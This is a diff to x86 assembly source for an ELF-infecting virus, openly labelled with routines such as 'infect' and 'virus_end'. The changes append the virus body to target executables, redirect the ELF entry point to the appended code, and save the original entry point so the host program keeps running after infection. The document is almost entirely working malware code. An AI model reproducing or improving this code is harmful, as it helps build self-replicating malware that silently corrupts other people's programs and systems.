@@ -53,6 +53,7 @@
 
 %define FD dword [ebp - 4]
 %define ELF_header ebp - 56 ; Subbing 56 because -4 for pc increment and 52 for elf header size 
+%define original_entry ebp - 60
 
 	global _start
 
@@ -84,7 +85,7 @@ infect:
 	
 	; Infect the file
 	lseek FD, 0, SEEK_END
-	mov esi, eax				; save file size in esi
+	mov esi, eax				; Save file size in esi
 	call get_my_loc
 	add ebx, _start
 	mov edx, virus_end - _start
@@ -92,15 +93,25 @@ infect:
 
 	; Modify entry point
 	lseek FD, 0, SEEK_SET
-	mov eax, dword [ELF_header + ENTRY] ; Save original entry point
+	mov eax, dword [ELF_header + ENTRY]
+	mov dword [original_entry], eax ; Save original entry point
 	mov eax, 0x8048000 			; ELF base address
 	add eax, esi 				; Set eax to end of file
 	mov dword [ELF_header + ENTRY], eax
 	lea ecx, [ELF_header]		
 	write FD, ecx, ELFHDR_size	; Writing the modified header
+	
+	; Changing return address
+	lseek FD, -4, SEEK_END
+	lea ecx, [original_entry]
+	write FD, ecx, 4
+	lseek FD, 0, SEEK_SET
 
 	close FD
-	jmp VirusExit
+	call get_my_loc
+	add ebx, PreviousEntryPoint
+	mov eax, [ebx]
+	jmp eax
 
 not_elf:
 	close FD
